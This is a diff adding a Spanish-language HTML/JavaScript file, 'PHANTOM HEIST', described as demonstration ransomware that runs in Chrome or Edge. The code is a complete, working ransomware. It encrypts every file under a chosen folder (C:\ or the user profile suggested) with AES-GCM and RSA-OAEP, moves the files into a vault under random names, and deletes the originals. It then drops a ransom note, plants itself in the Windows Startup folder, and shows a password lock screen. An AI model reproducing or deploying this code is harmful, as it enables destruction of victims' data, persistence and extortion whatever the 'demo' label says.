@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="icon" href="data:,">
+<title>PHANTOM HEIST</title>
+<!--
+  PHANTOM HEIST — ransomware de demostración, 100% cliente.
+  Requiere Chrome o Edge (File System Access API).
+  Deja CFG.PASS vacío para pedir la contraseña en cada ejecución.
+-->
+<style>
+  :root{--bg:#08080a;--pan:#101014;--fg:#e9e9ec;--mut:#78787f;--red:#e11d48;--ok:#22c55e;--ln:#22222a}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);min-height:100vh;
+    font:13px/1.55 ui-monospace,"Cascadia Mono",Consolas,monospace;padding:22px}
+  #app{max-width:900px;margin:0 auto}
+  .hide{display:none!important}
+  header{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--ln);
+    padding-bottom:10px;margin-bottom:20px;font-size:11px;letter-spacing:3px;color:var(--mut)}
+  header b{color:var(--red)}
+  h1{font-size:clamp(18px,3.6vw,30px);margin:0 0 10px;line-height:1.15;letter-spacing:-.5px}
+  .mut{color:var(--mut)}
+  #log{background:var(--pan);border:1px solid var(--ln);border-radius:4px;padding:8px 10px;height:220px;
+    overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-all;color:var(--mut)}
+  #log .f{color:var(--fg)} #log .e{color:var(--red)} #log .w{color:#eab308} #log .g{color:var(--ok)}
+  .bar{height:6px;background:#17171b;border-radius:3px;overflow:hidden;margin:12px 0}
+  .bar>i{display:block;height:100%;width:0;background:var(--red);transition:width .15s}
+  .bar.g>i{background:var(--ok)}
+  #stats{font-size:12px;color:var(--mut);margin-bottom:8px}
+  #stats b{color:var(--fg)}
+  button{font:inherit;cursor:pointer;border-radius:3px}
+  .big{width:100%;padding:13px;background:var(--red);border:0;color:#fff;letter-spacing:3px;
+    font-size:13px;font-weight:700;margin-top:14px}
+  .big:hover{filter:brightness(1.15)}
+  label.chk{display:flex;gap:8px;align-items:center;color:var(--mut);font-size:12px;margin:14px 0}
+  #lock{position:fixed;inset:0;background:#06060a;z-index:100;display:none;
+    align-items:center;justify-content:center;padding:24px;
+    background-image:radial-gradient(circle at 50% 0%,#2a0710 0%,#06060a 60%)}
+  #lock.on{display:flex}
+  .card{width:100%;max-width:620px;border:2px solid var(--red);border-radius:6px;background:#0d0d12;
+    box-shadow:0 0 60px rgba(225,29,72,.25);padding:30px 26px;text-align:center}
+  .card.err{animation:sh .32s}
+  @keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-9px)}75%{transform:translateX(9px)}}
+  .lock-ico{font-size:44px;line-height:1;color:var(--red);margin-bottom:12px;animation:bl 1.6s ease-in-out infinite}
+  @keyframes bl{50%{opacity:.35}}
+  .card h2{margin:0 0 14px;font-size:clamp(15px,3vw,22px);color:var(--red);letter-spacing:1px;line-height:1.3}
+  .meta{display:flex;justify-content:center;gap:18px;flex-wrap:wrap;color:var(--mut);
+    font-size:11px;letter-spacing:1px;border-top:1px solid #2a1119;border-bottom:1px solid #2a1119;
+    padding:10px 0;margin:0 0 18px}
+  .meta b{color:var(--fg)}
+  .idbox{color:var(--red);letter-spacing:3px;font-size:12px;margin-bottom:16px}
+  #pw{width:100%;padding:12px;background:#08080c;border:1px solid #3a1119;color:var(--fg);
+    font:inherit;text-align:center;letter-spacing:3px;border-radius:3px;outline:none}
+  #pw:focus{border-color:var(--red)}
+  #msg{min-height:18px;font-size:11px;letter-spacing:1px;margin-top:9px;color:var(--red)}
+  .alg{color:#4a4a52;font-size:10px;letter-spacing:2px;margin-top:16px}
+  #foot{margin-top:14px;color:var(--mut);font-size:11px}
+</style>
+</head>
+<body>
+<div id="app">
+  <header><span>PHANTOM<b>//</b>HEIST</span><span id="phase">IDLE</span></header>
+  <section id="idle">
+    <h1>Selecciona la raíz a secuestrar</h1>
+    <p class="mut">Carpetas renombradas, movidas a la bóveda y cifradas con nombres aleatorios.
+    Deja un descifrador en el Inicio de Windows si la raíz incluye tu perfil.<br>
+    Elige <b>C:\</b> o tu carpeta de usuario.</p>
+    <label class="chk"><input type="checkbox" id="sys"> incluir Windows / Program Files / ProgramData</label>
+    <label class="chk"><input type="checkbox" id="per" checked> persistencia en el Inicio de Windows</label>
+    <button class="big" id="go">ELEGIR CARPETA Y EJECUTAR</button>
+    <div id="foot">AES-256-GCM · RSA-OAEP-2048 · clave única por archivo</div>
+  </section>
+  <section id="work" class="hide">
+    <h1 id="wt">—</h1>
+    <div id="stats">—</div>
+    <div class="bar" id="bar"><i id="fill"></i></div>
+    <div id="log"></div>
+  </section>
+</div>
+<div id="lock"><div class="card" id="card">
+  <div class="lock-ico">🔒</div>
+  <h2>TUS ARCHIVOS HAN SIDO<br>MOVIDOS Y CIFRADOS</h2>
+  <div class="meta"><span><b id="m-files">0</b> archivos</span>
+    <span><b id="m-size">0 B</b></span><span><b id="m-time">00:00</b></span></div>
+  <div class="idbox">ID <span id="m-id">—</span></div>
+  <input id="pw" type="password" placeholder="CONTRASEÑA" autocomplete="off" spellcheck="false">
+  <button class="big" id="unlock">DESCIFRAR TODO Y RESTAURAR</button>
+  <div id="msg"></div>
+  <div class="alg">AES-256-GCM · RSA-OAEP-2048 · PBKDF2</div>
+</div></div>
+<script>
+"use strict";
+const CFG = {
+  PASS: '',                     // vacío = se pide al ejecutar
+  EXT: '.ph3ist',
+  NOTE: '_LEEME_PHANTOM_HEIST.txt',
+  MANIFEST: '_MANIFEST.json',
+  LOCK: 'LOCK.html',
+  STARTUP_NAME: '_PHANTOM_HEIST.html',
+  CHUNK: 1 << 20,
+  ITER: 250000,
+  SKIP_SYS: ['Windows','Program Files','Program Files (x86)','ProgramData','Config.Msi','Recovery','PerfLogs'],
+  SKIP_ALWAYS: ['$RECYCLE.BIN','System Volume Information'],
+  SKIP_DIR: ['node_modules','.git','.cache']
+};
+const MAGIC = new Uint8Array([0x50,0x48,0x4E,0x54,0x05,0,0,0]);
+const $ = i => document.getElementById(i);
+const logEl=$('log'), fill=$('fill'), statsEl=$('stats'), wt=$('wt'), barEl=$('bar');
+let root=null, pubKey=null, privKey=null, man=null, busy=false, t0=0, st=null, fails=0;
+
+const fmt = n => n<1024?n+' B':n<1048576?(n/1024).toFixed(1)+' KB':n<1073741824?(n/1048576).toFixed(2)+' MB':(n/1073741824).toFixed(2)+' GB';
+const mmss = ms => {const s=Math.floor(ms/1000);return String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0');};
+const rnd = n => [...crypto.getRandomValues(new Uint8Array(n))].map(x=>x.toString(16).padStart(2,'0')).join('');
+const rid = () => rnd(5).toUpperCase().replace(/(.{5})(.{5})/,'$1-$2');
+function log(t,c=''){const d=document.createElement('div');if(c)d.className=c;d.textContent=t;
+  logEl.appendChild(d);if(logEl.children.length>500)logEl.firstChild.remove();logEl.scrollTop=logEl.scrollHeight;}
+function paint(){ if(!st) return; const tot=st.total||1;
+  fill.style.width=(100*st.done/tot).toFixed(2)+'%';
+  statsEl.innerHTML='<b>'+st.ok+'</b> archivos · <b>'+fmt(st.bytes)+'</b> · <b>'+mmss(performance.now()-t0)+'</b>'; }
+
+const idb = () => new Promise((res,rej)=>{const r=indexedDB.open('ph3',1);
+  r.onupgradeneeded=()=>r.result.createObjectStore('kv');r.onsuccess=()=>res(r.result);r.onerror=()=>rej(r.error);});
+async function put(k,v){const d=await idb();d.transaction('kv','readwrite').objectStore('kv').put(v,k);}
+async function get(k){try{const d=await idb();return await new Promise(r=>{const q=d.transaction('kv').objectStore('kv').get(k);
+  q.onsuccess=()=>r(q.result);q.onerror=()=>r(null);});}catch(e){return null;}}
+async function del(k){const d=await idb();d.transaction('kv','readwrite').objectStore('kv').delete(k);}
+
+const enc=new TextEncoder();
+const seal=async(k,data)=>{const iv=crypto.getRandomValues(new Uint8Array(12));
+  const ct=new Uint8Array(await crypto.subtle.encrypt({name:'AES-GCM',iv},k,data));
+  const o=new Uint8Array(16+ct.length);o.set(iv);new DataView(o.buffer).setUint32(12,ct.length,true);o.set(ct,16);return o;};
+const unseal=async(k,buf)=>{const n=new DataView(buf.buffer,buf.byteOffset).getUint32(12,true);
+  return new Uint8Array(await crypto.subtle.decrypt({name:'AES-GCM',iv:buf.slice(0,12)},k,buf.slice(16,16+n)));};
+async function kek(pass,salt){
+  const b=await crypto.subtle.importKey('raw',enc.encode(pass),'PBKDF2',false,['deriveKey']);
+  return crypto.subtle.deriveKey({name:'PBKDF2',salt,iterations:CFG.ITER,hash:'SHA-256'},
+    b,{name:'AES-GCM',length:256},false,['encrypt','decrypt']);
+}
+function mkHeader(w,size,blocks){const h=new Uint8Array(22+w.byteLength+4),v=new DataView(h.buffer);
+  h.set(MAGIC,0);v.setBigUint64(12,BigInt(size),true);v.setUint16(20,w.byteLength,true);
+  h.set(new Uint8Array(w),22);v.setUint32(22+w.byteLength,blocks,true);return h;}
+function rdHeader(b){const v=new DataView(b.buffer,b.byteOffset,b.byteLength);
+  for(let i=0;i<8;i++) if(b[i]!==MAGIC[i]) throw new Error('formato');
+  const wl=v.getUint16(20,true);
+  return {size:Number(v.getBigUint64(12,true)),wrapped:b.slice(22,22+wl),blocks:v.getUint32(22+wl,true),off:26+wl};}
+async function newDek(){const k=await crypto.subtle.generateKey({name:'AES-GCM',length:256},true,['encrypt','decrypt']);
+  const raw=await crypto.subtle.exportKey('raw',k);
+  return {k,wrapped:await crypto.subtle.encrypt({name:'RSA-OAEP'},pubKey,raw)};}
+
+let skip=null;
+async function scan(dir){
+  const node=[];
+  for await (const [name,h] of dir.entries()){
+    if(skip.has(name)||CFG.SKIP_DIR.includes(name)) continue;
+    if(h.kind==='file'){ const f=await h.getFile();
+      node.push({n:name,k:'f',a:'f_'+rnd(4)+CFG.EXT}); st.total++; st.bytes+=f.size; }
+    else{ node.push({n:name,k:'d',a:'d_'+rnd(4),t:await scan(h)}); }
+    if(node.length%64===0) paint();
+  }
+  return node;
+}
+
+async function encInto(srcDir,name,dstDir,outName){
+  const file=await (await srcDir.getFileHandle(name)).getFile();
+  try{ await dstDir.removeEntry(outName); }catch(e){}
+  const {k,wrapped}=await newDek();
+  const blocks=Math.ceil(file.size/CFG.CHUNK);
+  const w=await (await dstDir.getFileHandle(outName,{create:true})).createWritable();
+  await w.write(mkHeader(wrapped,file.size,blocks));
+  for(let i=0;i<blocks;i++){
+    const a=i*CFG.CHUNK,b=Math.min(a+CFG.CHUNK,file.size);
+    await w.write(await seal(k,new Uint8Array(await file.slice(a,b).arrayBuffer())));
+  }
+  await w.close(); await srcDir.removeEntry(name);
+  st.ok++; st.done++; paint();
+}
+async function cifrar(srcDir,node,dstDir){
+  for(const e of node){
+    if(e.k==='f'){ await encInto(srcDir,e.n,dstDir,e.a); }
+    else{
+      const sh=await srcDir.getDirectoryHandle(e.n);
+      const dh=await dstDir.getDirectoryHandle(e.a,{create:true});
+      await cifrar(sh,e.t,dh);
+      try{ await srcDir.removeEntry(e.n); }catch(err){}
+    }
+  }
+}
+async function decInto(srcDir,name,dstDir,outName){
+  const file=await (await srcDir.getFileHandle(name)).getFile();
+  const h=rdHeader(new Uint8Array(await file.slice(0,1024).arrayBuffer()));
+  const raw=await crypto.subtle.decrypt({name:'RSA-OAEP'},privKey,h.wrapped);
+  const k=await crypto.subtle.importKey('raw',raw,{name:'AES-GCM'},false,['decrypt']);
+  try{ await dstDir.removeEntry(outName); }catch(e){}
+  const w=await (await dstDir.getFileHandle(outName,{create:true})).createWritable();
+  let off=h.off;
+  for(let i=0;i<h.blocks;i++){
+    const hd=new Uint8Array(await file.slice(off,off+16).arrayBuffer());
+    const n=new DataView(hd.buffer).getUint32(12,true);
+    const ct=new Uint8Array(await file.slice(off,off+16+n).arrayBuffer());
+    await w.write(await unseal(k,ct)); off+=16+n;
+  }
+  await w.close(); await srcDir.removeEntry(name);
+  st.ok++; st.done++; paint();
+}
+async function devolver(srcDir,node,dstDir){
+  for(const e of node){
+    try{
+      if(e.k==='f'){
+        try{ await srcDir.getFileHandle(e.a); }catch(x){ log('  · sin cifrar: '+e.n,'w'); continue; }
+        await decInto(srcDir,e.a,dstDir,e.n);
+      }else{
+        let sh; try{ sh=await srcDir.getDirectoryHandle(e.a); }catch(x){ continue; }
+        const dh=await dstDir.getDirectoryHandle(e.n,{create:true});
+        await devolver(sh,e.t,dh);
+        try{ await srcDir.removeEntry(e.a); }catch(x){}
+      }
+    }catch(err){ log('  ✗ '+e.n+' — '+(err&&err.name||err),'e'); }
+  }
+}
+
+async function findStartup(){
+  const tail=['AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup'];
+  const probe=async(base,segs)=>{ let d=base;
+    try{ for(const s of segs) d=await d.getDirectoryHandle(s); return d; }catch(e){ return null; } };
+  let d=await probe(root,tail);
+  if(d) return {dir:d,segs:tail};
+  try{
+    const users=await root.getDirectoryHandle('Users');
+    for await (const [u,h] of users.entries()){
+      if(h.kind!=='directory'||u.startsWith('.')) continue;
+      const base=await users.getDirectoryHandle(u);
+      d=await probe(base,tail);
+      if(d) return {dir:d,segs:['Users',u,...tail]};
+    }
+  }catch(e){}
+  return null;
+}
+
+async function escribirLock(startup){
+  const html='<!DOCTYPE html>\n'+document.documentElement.outerHTML
+    .replace('</head>','<script>window.__MAN='+JSON.stringify(man)+';<\/script></head>');
+  try{ const w=await (await root.getFileHandle(CFG.LOCK,{create:true})).createWritable();
+    await w.write(html); await w.close(); log('[+] descifrador en la raíz: '+CFG.LOCK,'g'); }
+  catch(e){ log('[!] LOCK.html: '+e.name,'e'); }
+  if(!startup) return;
+  try{
+    const w=await (await startup.dir.getFileHandle(CFG.STARTUP_NAME,{create:true})).createWritable();
+    await w.write(html); await w.close();
+    man.startup=startup.segs; log('[+] persistencia: Inicio de Windows','g');
+  }catch(e){ log('[!] Inicio: '+e.name,'e'); }
+}
+
+async function ejecutar(){
+  if(busy) return; busy=true;
+  let pass=CFG.PASS;
+  if(!pass){ pass=prompt('Contraseña de rescate para esta pasada:'); }
+  if(!pass){ busy=false; return; }
+
+  $('idle').classList.add('hide'); $('work').classList.remove('hide'); $('phase').textContent='CIFRANDO';
+  try{ root=await window.showDirectoryPicker({id:'ph3root',mode:'readwrite',startIn:'documents'}); }
+  catch(e){ $('idle').classList.remove('hide'); $('work').classList.add('hide'); busy=false; return; }
+  try{ await root.requestPermission({mode:'readwrite'}); }catch(e){}
+  try{ document.documentElement.requestFullscreen?.().catch(()=>{}); }catch(e){}
+
+  const kp=await crypto.subtle.generateKey({name:'RSA-OAEP',modulusLength:2048,
+    publicExponent:new Uint8Array([1,0,1]),hash:'SHA-256'},true,['encrypt','decrypt']);
+  pubKey=kp.publicKey; privKey=kp.privateKey;
+  const salt=crypto.getRandomValues(new Uint8Array(16));
+  const wrappedPriv=await seal(await kek(pass,salt),await crypto.subtle.exportKey('pkcs8',privKey));
+
+  const id=rid(), loot='PHANTOM_HEIST_'+id;
+  skip=new Set([...CFG.SKIP_ALWAYS,...($('sys').checked?[]:CFG.SKIP_SYS),CFG.NOTE,CFG.LOCK,loot]);
+
+  t0=performance.now(); st={total:0,bytes:0,done:0,ok:0};
+  wt.textContent='Inventariando '+root.name+'…';
+  const tree=await scan(root);
+  log('[+] archivos: '+st.total+' · '+fmt(st.bytes));
+  const bytesTot=st.bytes;
+
+  const startup=$('per').checked?await findStartup():null;
+  if($('per').checked&&!startup) log('[!] carpeta Inicio no alcanzable','w');
+
+  const lootDir=await root.getDirectoryHandle(loot,{create:true});
+  man={id,loot,root:root.name,ts:Date.now(),files:st.total,bytes:bytesTot,
+       salt:Array.from(salt),wrappedPriv:Array.from(wrappedPriv),tree};
+  try{ const w=await (await lootDir.getFileHandle(CFG.MANIFEST,{create:true})).createWritable();
+    await w.write(JSON.stringify(man)); await w.close(); }catch(e){}
+  await put('man',man);
+
+  st.done=0; st.ok=0; st.bytes=bytesTot;
+  wt.textContent='Cifrando → '+loot;
+  const tick=setInterval(paint,150);
+  await cifrar(root,tree,lootDir);
+  clearInterval(tick);
+
+  man.elapsed=performance.now()-t0;
+  try{ const w=await (await lootDir.getFileHandle(CFG.MANIFEST,{create:true})).createWritable();
+    await w.write(JSON.stringify(man)); await w.close(); }catch(e){}
+  await escribirLock(startup);
+  await put('man',man);
+  try{ const w=await (await root.getFileHandle(CFG.NOTE,{create:true})).createWritable();
+    await w.write('PHANTOM HEIST\nID: '+id+'\nBóveda: '+loot+
+      '\nAbre '+CFG.LOCK+' y mete la contraseña para restaurarlo todo.\n'); await w.close(); }catch(e){}
+
+  busy=false; mostrarLock();
+}
+
+function mostrarLock(){
+  $('lock').classList.add('on');
+  $('m-files').textContent=man.files; $('m-size').textContent=fmt(man.bytes);
+  $('m-time').textContent=mmss(man.elapsed||0); $('m-id').textContent=man.id;
+  $('pw').value=''; $('msg').textContent=''; setTimeout(()=>$('pw').focus(),120);
+}
+
+async function desbloquear(){
+  if(busy) return;
+  const pass=$('pw').value;
+  if(!pass){ $('msg').textContent='introduce la contraseña'; return; }
+  busy=true; $('msg').textContent='verificando…';
+  try{
+    const kk=await kek(pass,new Uint8Array(man.salt));
+    privKey=await crypto.subtle.importKey('pkcs8',
+      await crypto.subtle.decrypt({name:'AES-GCM',iv:new Uint8Array(12)},kk,new Uint8Array(man.wrappedPriv)),
+      {name:'RSA-OAEP',hash:'SHA-256'},false,['decrypt']);
+  }catch(e){
+    fails++; busy=false; $('card').classList.add('err');
+    setTimeout(()=>$('card').classList.remove('err'),340);
+    $('msg').textContent='contraseña incorrecta · intento '+fails; $('pw').select(); return;
+  }
+  $('msg').textContent='correcta · restaurando…';
+  setTimeout(()=>{ $('lock').classList.remove('on'); $('idle').classList.add('hide');
+    $('work').classList.remove('hide'); restaurar(); },500);
+}
+
+async function restaurar(){
+  $('phase').textContent='RESTAURANDO'; barEl.classList.add('g');
+  wt.textContent='Devolviendo '+man.loot+' a su sitio'; logEl.innerHTML='';
+  try{ root=await window.showDirectoryPicker({id:'ph3root',mode:'readwrite',startIn:'documents'}); }
+  catch(e){ $('lock').classList.add('on'); busy=false; return; }
+  try{ await root.requestPermission({mode:'readwrite'}); }catch(e){}
+
+  let lootDir=null;
+  try{ lootDir=await root.getDirectoryHandle(man.loot); }
+  catch(e){
+    for await (const [name,h] of root.entries()){
+      if(h.kind==='directory'&&name.startsWith('PHANTOM_HEIST_')){
+        lootDir=await root.getDirectoryHandle(name); man.loot=name;
+        try{ man=JSON.parse(await (await (await lootDir.getFileHandle(CFG.MANIFEST)).getFile()).text()); }
+        catch(x){ log('[-] manifiesto ilegible','e'); }
+        break;
+      }
+    }
+    if(!lootDir){ log('[-] no encuentro la bóveda en esta raíz','e'); busy=false; return; }
+  }
+
+  t0=performance.now(); st={total:man.files,bytes:man.bytes,done:0,ok:0};
+  const tick=setInterval(paint,150);
+  await devolver(lootDir,man.tree,root);
+  clearInterval(tick);
+
+  if(man.startup){
+    try{ let d=root;
+      for(const s of man.startup.slice(0,-1)) d=await d.getDirectoryHandle(s);
+      await d.removeEntry(man.startup[man.startup.length-1]); log('[+] persistencia eliminada','g');
+    }catch(e){}
+  }
+  try{ await root.removeEntry(CFG.LOCK); }catch(e){}
+  try{ await lootDir.removeEntry(CFG.MANIFEST); }catch(e){}
+  try{ await root.removeEntry(CFG.NOTE); }catch(e){}
+  try{ await root.removeEntry(man.loot); }catch(e){}
+  await del('man');
+
+  wt.textContent='TODO RESTAURADO'; log('');
+  log('═══ RESTAURADO ═══','g'); log(st.ok+' archivos devueltos a '+man.root,'g');
+  $('phase').textContent='LIMPIADO'; busy=false;
+}
+
+(async function(){
+  $('go').onclick=ejecutar; $('unlock').onclick=desbloquear;
+  $('pw').addEventListener('keydown',e=>{ if(e.key==='Enter') desbloquear(); });
+  if(!window.showDirectoryPicker){ $('foot').textContent='Necesita Chrome o Edge'; $('go').disabled=true; return; }
+  if(window.__MAN){ man=window.__MAN; $('idle').classList.add('hide');
+    $('work').classList.remove('hide'); mostrarLock(); return; }
+  man=await get('man'); if(man) mostrarLock();
+})();
+</script>
+</body>
+</html>
